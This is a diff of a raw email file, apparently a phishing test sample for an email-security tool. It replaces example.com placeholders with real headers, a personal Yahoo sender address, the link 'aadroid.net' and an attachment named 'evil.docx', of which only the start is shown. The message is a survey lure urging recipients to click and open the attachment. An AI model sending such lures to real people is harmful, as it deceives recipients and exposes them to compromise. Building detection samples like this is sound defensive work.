@@ -1,58 +1,58 @@
-Received: from example.com12.example.com.com (2603:10b6:5:177::36)
- by example.com12.example.com.com with HTTPS via
- example.com02.example.com.COM; Thu, 18 Jul 2019 12:24:41 +0000
-Received: from example.com12.example.com.com (2603:10b6:405:70::18)
- by example.com12.example.com.com (2603:10b6:404:c8::22) with
+Received: from BN6SPR00MB252.namprd12.prod.outlook.com (2603:10b6:5:177::36)
+ by DM5PR12MB1817.namprd12.prod.outlook.com with HTTPS via
+ DM6PR02CA0059.NAMPRD02.PROD.OUTLOOK.COM; Thu, 18 Jul 2019 12:24:41 +0000
+Received: from BN6PR12CA0032.namprd12.prod.outlook.com (2603:10b6:405:70::18)
+ by BN6SPR00MB252.namprd12.prod.outlook.com (2603:10b6:404:c8::22) with
  Microsoft SMTP Server (version=TLS1_2,
  cipher=TLS_ECDHE_RSA_WITH_AES_256_GCM_SHA384) id 15.20.2094.11; Thu, 18 Jul
  2019 12:24:39 +0000
-Received: from example.com-example.com.example.com.com
- (2a01:111:f400:7e41::208) by example.com.example.com
+Received: from BN3NAM01FT059.eop-nam01.prod.protection.outlook.com
+ (2a01:111:f400:7e41::208) by BN6PR12CA0032.outlook.office365.com
  (2603:10b6:405:70::18) with Microsoft SMTP Server (version=TLS1_2,
  cipher=TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384) id 15.20.2073.14 via Frontend
  Transport; Thu, 18 Jul 2019 12:24:39 +0000
-Authentication-Results: spf=pass (sender IP is 198.162.1.1)
- example.com=example.com; example.com.com; dkim=pass (signature was
- verified) header.d=example.com;example.com.com; dmarc=pass
- action=none example.com=example.com;compauth=pass reason=100
-Received-SPF: Pass (example.com.com: domain of example.com designates
- 198.162.1.1 as permitted sender) receiver=example.com.com;
- client-ip=198.162.1.1; helo=example.com.example.com1.example.com;
-Received: from example.com.example.com1.example.com (198.162.1.1) by
- example.com.example.com.com (198.162.1.1) with Microsoft SMTP
+Authentication-Results: spf=pass (sender IP is 66.163.184.200)
+ smtp.mailfrom=yahoo.com; komanddev.onmicrosoft.com; dkim=pass (signature was
+ verified) header.d=yahoo.com;komanddev.onmicrosoft.com; dmarc=pass
+ action=none header.from=yahoo.com;compauth=pass reason=100
+Received-SPF: Pass (protection.outlook.com: domain of yahoo.com designates
+ 66.163.184.200 as permitted sender) receiver=protection.outlook.com;
+ client-ip=66.163.184.200; helo=sonic301-31.consmr.mail.ne1.yahoo.com;
+Received: from sonic301-31.consmr.mail.ne1.yahoo.com (66.163.184.200) by
+ BN3NAM01FT059.mail.protection.outlook.com (10.152.66.160) with Microsoft SMTP
  Server (version=TLS1_2, cipher=TLS_ECDHE_RSA_WITH_AES_256_CBC_SHA384) id
  15.20.2032.15 via Frontend Transport; Thu, 18 Jul 2019 12:24:38 +0000
-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=example.com; s=s2048; t=1563452678; bh=TGatgKz/i01tp8qC32NV2+NjMXzoITKGUQMjnShZ6Jg=; h=Date:From:To:Subject:References:From:Subject; b=PdoXuxcU9GOIwDRHNYn9FTRQCxvxaselOi67WJIeLz5y1ZXQWA80IvSQHeS0Ln12tn+fk17Aulmg30bBw+UlJlDGesGZWBowQS8XtkqeG8WQfEFKQPuwiuzvQWNfd8ELNSh97nhdip7K1cLvQ1XfIZI8lHtyDST7XaEzmXOolKBfxB34CAyUjlA/RvUchtsM34+pmikm3YHz6uCZOULfQXOA/kwME3QIeYzcPFgHvGy8MzWB6RDrQa3JOs94bbsoJE7xMLkXQZNHuBgiX5Ik+1BlDgEUcGjkT+gjcZBMY0BxzHQwdbNnw9KxkgkKvEcpRvcEsjcPvX+kvwaJLxrLUg==
-X-YMail-OSG: example.comexample.com.mbi_example.com5PbPXC4
- example.com10wg4xl6OsZNG5lWtzYhDOf_QQCEINV0oroD
- BM_example.comexample.com0vzRAzzjWtxuM_J_dKysDBdolm9UInzW30dRq.1ljpW
+DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed; d=yahoo.com; s=s2048; t=1563452678; bh=TGatgKz/i01tp8qC32NV2+NjMXzoITKGUQMjnShZ6Jg=; h=Date:From:To:Subject:References:From:Subject; b=PdoXuxcU9GOIwDRHNYn9FTRQCxvxaselOi67WJIeLz5y1ZXQWA80IvSQHeS0Ln12tn+fk17Aulmg30bBw+UlJlDGesGZWBowQS8XtkqeG8WQfEFKQPuwiuzvQWNfd8ELNSh97nhdip7K1cLvQ1XfIZI8lHtyDST7XaEzmXOolKBfxB34CAyUjlA/RvUchtsM34+pmikm3YHz6uCZOULfQXOA/kwME3QIeYzcPFgHvGy8MzWB6RDrQa3JOs94bbsoJE7xMLkXQZNHuBgiX5Ik+1BlDgEUcGjkT+gjcZBMY0BxzHQwdbNnw9KxkgkKvEcpRvcEsjcPvX+kvwaJLxrLUg==
+X-YMail-OSG: tM1Gu.IVM1kfHbPWK4xbOlDB3gCHJ9mc.PG.mbi_tCKtI4dA.IJUQMsF5PbPXC4
+ ARkt0eecrP5BUlzHMRvjXxITns8Ial14vx.qEcGn10wg4xl6OsZNG5lWtzYhDOf_QQCEINV0oroD
+ BM_SYJ9eACJj.HlcmuJXa3AiMi.lajdWA0vzRAzzjWtxuM_J_dKysDBdolm9UInzW30dRq.1ljpW
  n9A6XAdtgnZS9mVPhvo3NQT9jOGJcKjPUPEB9URV1itW6H1uAoZTzJOFoZkliMbdmz6xUIqVhkLY
  Kl_3PPkpHEa71bqNJYHUpxHLeXHjjyaSA4jDctSXpXAqud9CKSVL1qHoUUsXBf5KDLZ7htymnM_q
- example.com41qUwJmOOQQyd8jd0CuxyuJDoKojrlZzO0iMLT4g0shqkDA8DCe4.6Gof7P32vA5dJ
+ Fkzf.rNHvl41qUwJmOOQQyd8jd0CuxyuJDoKojrlZzO0iMLT4g0shqkDA8DCe4.6Gof7P32vA5dJ
  cT.r7VZfLi7NkboIjO9QfzkTLdSSymfyAEpqpaPldtuDNZihe_7j2EZ6HNpGMcJwOxLDDyYpeBtL
- j5_example.com.ZhGsB6
- example.com9G6PtJY.
- example.com6L7UN041o04ogUW3nT_AY.s8kXxwDuLqqiB9YDwJCt0ZNkY
+ j5_4ZiCBgCjkMJpBxIEcVLkFnDaNEvoGc9Yb3kO9hxsaWd63LkHkWr61fjjxu.gTYbEXe.ZhGsB6
+ x7Lrjvy0D6YEAVi5zX7SvFzDSmdn7QBApMHsyhAC1Mz9DBH9Lv7gU.pmyonNNMNWMraU9G6PtJY.
+ lH6zgBai2kDG6o9Yk3lD6SEIS1.HK6L7UN041o04ogUW3nT_AY.s8kXxwDuLqqiB9YDwJCt0ZNkY
  o1r9kuLywf3aIaUnXTlkLO6lG8JXSYGlKdXRxUYVMe653aQ9osnLfWIQEoMw5UnRvS3fEzjxiaoe
- example.com5RECxzcvudnd9GuL_quMG6hjI_tbxb
+ oQ28lC5Cnrn9lctSIZZulQWuT9mW.VSmgqEzwQNFqDvRRU5RECxzcvudnd9GuL_quMG6hjI_tbxb
  RPA2EaOCe9kbUef7VwylaJLCElHOgbym6RlcJMsqfM1FskouwwoOKMvgYsHGr7GhxwR.32z57SDg
- example.com_pxZyxFySmC8JU2Bhmuehjl6agnvOTwpphzbaDDuxpZgU
+ TNRCV9HQfeDPGvmFLLDJws1RnPZj.uw_pxZyxFySmC8JU2Bhmuehjl6agnvOTwpphzbaDDuxpZgU
  5DK3ns8pIGu1yCIxzvR8qUXk9alLg2cix52mpW6_l5SMtuy98RjQXOrj3QKeUawnudjuyjOsfUF7
- 4UmqyLzY_.82JY379_jmlhcTrKgA.example.com.I9gw_D7UiIPbBonaPe3xkhszctH
+ 4UmqyLzY_.82JY379_jmlhcTrKgA.6f13wgsIkyeXsn.dZJO.I9gw_D7UiIPbBonaPe3xkhszctH
  VZp0Za4VmTduYpC__kGdrpwctXSGsw9qB60V8lWejFtP.3YikAF1L8rLWWu4rA2Whlff8dtq4DhL
  je6ToVRF2UTUE_mQ-
-Received: from example.com.example.com1.example.com by example.com.example.com1.example.com with HTTP; Thu, 18 Jul 2019 12:24:38 +0000
+Received: from sonic.gate.mail.ne1.yahoo.com by sonic301.consmr.mail.ne1.yahoo.com with HTTP; Thu, 18 Jul 2019 12:24:38 +0000
 Date: Thu, 18 Jul 2019 12:24:36 +0000 (UTC)
-From: sydney Coffaro <user@example.com>
-To: "user@example.com" <user@example.com>
-Message-ID: <user@example.com>
+From: sydney Coffaro <sydneycoffaro@yahoo.com>
+To: "demo@komanddev.onmicrosoft.com" <demo@komanddev.onmicrosoft.com>
+Message-ID: <1526823673.3763762.1563452676187@mail.yahoo.com>
 Subject: API Security Survey (please take this important survey)"
 Content-Type: multipart/mixed;
 	boundary="----=_Part_3763761_1096964018.1563452676187"
-References: <user@example.com>
+References: <1526823673.3763762.1563452676187.ref@mail.yahoo.com>
 X-Mailer: WebService/1.1.13991 YMailNorrin Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.100 Safari/537.36
 Content-Length: 32481
-Return-Path: user@example.com
+Return-Path: sydneycoffaro@yahoo.com
 X-MS-Exchange-Organization-ExpirationStartTime: 18 Jul 2019 12:24:38.8966
  (UTC)
 X-MS-Exchange-Organization-ExpirationStartTimeReason: OriginalSubmit
@@ -64,9 +64,9 @@ X-EOPAttributedMessage: 0
 X-EOPTenantAttributedMessage: 5c824599-dc8c-4d31-96fb-3b886d4f8f10:0
 X-MS-Exchange-Organization-MessageDirectionality: Incoming
 X-Forefront-Antispam-Report:
- CIP:198.162.1.1;IPV:NLI;CTRY:US;EFV:NLI;SFV:NSPM;SFS:(2980300002)(286005)(199004)(189003)(16586007)(5024004)(14444005)(106002)(2351001)(606006)(336012)(446003)(426003)(356004)(33964004)(76176011)(26005)(126002)(7036003)(11686005)(21490400003)(7066003)(34766002)(486006)(246002)(476003)(86362001)(85226003)(7596002)(568964002)(2476003)(8676002)(7636002)(37276005)(6916009)(2420400007)(88526003)(2501003)(82202003)(6306002)(236005)(16003)(5640700003)(733005)(1096003)(15650500001)(53376002)(1730700003)(53386004)(50226002)(71190400001)(62882003);DIR:INB;SFP:;SCL:1;SRVR:BN6SPR00MB252;H:example.com.example.com1.example.com;FPR:;SPF:Pass;LANG:en;PTR:example.com.example.com1.example.com;A:1;MX:1;
+ CIP:66.163.184.200;IPV:NLI;CTRY:US;EFV:NLI;SFV:NSPM;SFS:(2980300002)(286005)(199004)(189003)(16586007)(5024004)(14444005)(106002)(2351001)(606006)(336012)(446003)(426003)(356004)(33964004)(76176011)(26005)(126002)(7036003)(11686005)(21490400003)(7066003)(34766002)(486006)(246002)(476003)(86362001)(85226003)(7596002)(568964002)(2476003)(8676002)(7636002)(37276005)(6916009)(2420400007)(88526003)(2501003)(82202003)(6306002)(236005)(16003)(5640700003)(733005)(1096003)(15650500001)(53376002)(1730700003)(53386004)(50226002)(71190400001)(62882003);DIR:INB;SFP:;SCL:1;SRVR:BN6SPR00MB252;H:sonic301-31.consmr.mail.ne1.yahoo.com;FPR:;SPF:Pass;LANG:en;PTR:sonic301-31.consmr.mail.ne1.yahoo.com;A:1;MX:1;
 X-MS-Exchange-Organization-AuthSource:
- example.com-example.com.example.com.com
+ BN3NAM01FT059.eop-nam01.prod.protection.outlook.com
 X-MS-Exchange-Organization-AuthAs: Anonymous
 X-MS-PublicTrafficType: Email
 X-MS-Office365-Filtering-Correlation-Id: cd5b6a83-c655-4194-59e4-08d70b7ae732
@@ -113,7 +113,7 @@ Why you should take the survey:
 We appreciate your time. Like you, we are busy people. But a quick survey c=
 an add to the "Wisdom of Crowds" in a major way.
 
-Check out this link: example.com
+Check out this link: aadroid.net
 
 Thanks
 
@@ -139,7 +139,7 @@ United States
 |  |=20
 Welcome to Neopets!
 
-example.com - Virtual Pet Community! Join up for free games, shops, auction=
+Neopets.Com - Virtual Pet Community! Join up for free games, shops, auction=
 s, chat and more!
  |
 
@@ -167,7 +167,7 @@ t-family: Helvetica; font-size: 12px;"><br style=3D"font-family: Helvetica;=
 >You are invited to take the&nbsp;API&nbsp;Security Survey. It takes less t=
 han 5 minutes.</span><br style=3D"font-family: Helvetica; font-size: 12px;"=
 ><br style=3D"font-family: Helvetica; font-size: 12px;"><a href=3D"http://a=
-example.com/" rel=3D"nofollow" target=3D"_blank">SURVEY LINK<br></a><span st=
+adroid.net/" rel=3D"nofollow" target=3D"_blank">SURVEY LINK<br></a><span st=
 yle=3D"font-family: Helvetica; font-size: 12px;"></span><div style=3D"font-=
 family: Helvetica; font-size: 9pt;">&nbsp;&nbsp;(Google Docs Survey)</div><=
 br style=3D"font-family: Helvetica; font-size: 12px;"><span style=3D"font-f=
@@ -185,13 +185,13 @@ rom other IT experts</span><br style=3D"font-family: Helvetica; font-size: =
  you, we are busy people. But a quick survey can add to the &quot;Wisdom of=
  Crowds&quot; in a major way.</span><br style=3D"font-family: Helvetica; fo=
 nt-size: 12px;"><br style=3D"font-family: Helvetica; font-size: 12px;">Chec=
-k out this link: example.com<br><br style=3D"font-family: Helvetica; font-s=
+k out this link: aadroid.net<br><br style=3D"font-family: Helvetica; font-s=
 ize: 12px;"><span style=3D"font-family: Helvetica; font-size: 12px;">Thanks=
 </span><br style=3D"font-family: Helvetica; font-size: 12px;"><br style=3D"=
 font-family: Helvetica; font-size: 12px;"><span style=3D"font-family: Helve=
 tica; font-size: 12px;">The Kavach Team</span><br style=3D"font-family: Hel=
 vetica; font-size: 12px;"><br style=3D"font-family: Helvetica; font-size: 1=
-2px;"><img src=3D"http://cdn-secure.s3.example.com/ks/kavach_example.com" al=
+2px;"><img src=3D"http://cdn-secure.s3.amazonaws.com/ks/kavach_logo.png" al=
 t=3D"Kavach" border=3D"0" class=3D"ydp81bd8b53yiv4126758428" data-id=3D"156=
 2771239468" style=3D"font-family: Helvetica; font-size: 12px; width: 200px;=
  max-width: 400px;"><div class=3D"ydp81bd8b53yiv4126758428ydp7a4ad511signat=
@@ -204,10 +204,10 @@ color: rgb(51, 51, 51);">Kavach</span><br><span style=3D"color: rgb(51, 51,=
 &quot;Helvetica Neue&quot;, Helvetica, Arial, sans-serif;"><br></div><div i=
 d=3D"ydp8ba5ecb5enhancr_card_3291331604" class=3D"ydp8ba5ecb5yahoo-link-enh=
 ancr-card ydp8ba5ecb5ymail-preserve-class ydp8ba5ecb5ymail-preserve-style" =
-data-url=3D"http://example.com" data-type=3D"YENHANCER" data-size=3D"MEDIUM=
+data-url=3D"http://neopets.com" data-type=3D"YENHANCER" data-size=3D"MEDIUM=
 " style=3D"color: rgb(0, 0, 0); max-width: 400px; font-family: &quot;Helvet=
 ica Neue&quot;, &quot;Segoe UI&quot;, Helvetica, Arial, sans-serif;"><a hre=
-f=3D"http://example.com/" class=3D"ydp8ba5ecb5yahoo-enhancr-cardlink" style=
+f=3D"http://neopets.com/" class=3D"ydp8ba5ecb5yahoo-enhancr-cardlink" style=
 =3D"color: rgb(0, 0, 0) !important;" rel=3D"nofollow" target=3D"_blank"><ta=
 ble border=3D"0" class=3D"ydp8ba5ecb5card-wrapper ydp8ba5ecb5yahoo-ignore-t=
 able" cellpadding=3D"0" cellspacing=3D"0" style=3D"max-width: 400px;"><tbod=
@@ -216,17 +216,17 @@ y><tr><td width=3D"400"><table border=3D"0" class=3D"ydp8ba5ecb5card ydp8ba=
  style=3D"max-width: 400px; border: 1px solid rgb(224, 228, 233); border-to=
 p-left-radius: 2px; border-top-right-radius: 2px; border-bottom-right-radiu=
 s: 2px; border-bottom-left-radius: 2px;"><tbody><tr><td class=3D"ydp8ba5ecb=
-5card-primary-image-cell" background=3D"https://s.example.com/lo/api/res/1.2/C=
+5card-primary-image-cell" background=3D"https://s.yimg.com/lo/api/res/1.2/C=
 SQ3nFJ0deKM4RDG.h4t4Q--~A/Zmk9ZmlsbDt3PTQwMDtoPTIwMDthcHBpZD1pZXh0cmFjdA--/=
-http://example.com.com/homepage/marquee/moneytree_example.com.cf.jpg" bgcol=
+http://images.neopets.com/homepage/marquee/moneytree_2012.jpg.cf.jpg" bgcol=
 or=3D"#000000" valign=3D"top" height=3D"175" style=3D"background-color: rgb=
 (0, 0, 0); background-size: cover; position: relative; border-top-left-radi=
 us: 2px; border-top-right-radius: 2px; border-bottom-right-radius: 0px; bor=
 der-bottom-left-radius: 0px; min-height: 175px;"><table border=3D"0" class=
 =3D"ydp8ba5ecb5card-overlay-container-table ydp8ba5ecb5yahoo-ignore-table" =
 cellpadding=3D"0" cellspacing=3D"0" style=3D"width: 398px;"><tbody><tr><td =
-class=3D"ydp8ba5ecb5card-overlay-cell" background=3D"https://s.example.com/cv/=
-ae/nq/storm/assets/enhancrV21/1/enhancr_example.com" bgcolor=3D"tr=
+class=3D"ydp8ba5ecb5card-overlay-cell" background=3D"https://s.yimg.com/cv/=
+ae/nq/storm/assets/enhancrV21/1/enhancr_gradient-400x175.png" bgcolor=3D"tr=
 ansparent" valign=3D"top" style=3D"background-color: transparent; border-to=
 p-left-radius: 2px; border-top-right-radius: 2px; border-bottom-right-radiu=
 s: 0px; border-bottom-left-radius: 0px; min-height: 175px;"><table border=
@@ -246,7 +246,7 @@ adius: 0px 0px 0px 2px;"></td><td style=3D"vertical-align: middle; padding:=
 =3D"ydp8ba5ecb5card-title" style=3D"font-size: 14px; line-height: 19px; mar=
 gin: 0px 0px 6px; color: rgb(38, 40, 42);">Welcome to Neopets!</h2><p class=
 =3D"ydp8ba5ecb5card-description" style=3D"font-size: 12px; line-height: 16p=
-x; margin: 0px; color: rgb(151, 155, 167);">example.com - Virtual Pet Commu=
+x; margin: 0px; color: rgb(151, 155, 167);">Neopets.Com - Virtual Pet Commu=
 nity! Join up for free games, shops, auctions, chat and more!</p></td></tr>=
 </tbody></table></td></tr></tbody></table></td></tr></tbody></table></a></d=
 iv></div></div></div></body></html>=
@@ -254,10 +254,10 @@ iv></div></div></div></body></html>=
 ------=_Part_3763760_1743927376.1563452676053--
 
 ------=_Part_3763761_1096964018.1563452676187
-Content-Type: application/example.com-example.com.document
+Content-Type: application/vnd.openxmlformats-officedocument.wordprocessingml.document
 Content-Transfer-Encoding: base64
-Content-Disposition: attachment; filename="example.com"
-Content-ID: <user@example.com>
+Content-Disposition: attachment; filename="evil.docx"
+Content-ID: <94161f77-4756-edc0-0f2a-6bbbfbedc434@yahoo.com>
 
 UEsDBBQABgAIAAAAIQDfpNJsWgEAACAFAAATAAgCW0NvbnRlbnRfVHlwZXNdLnhtbCCiBAIooAAC
 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
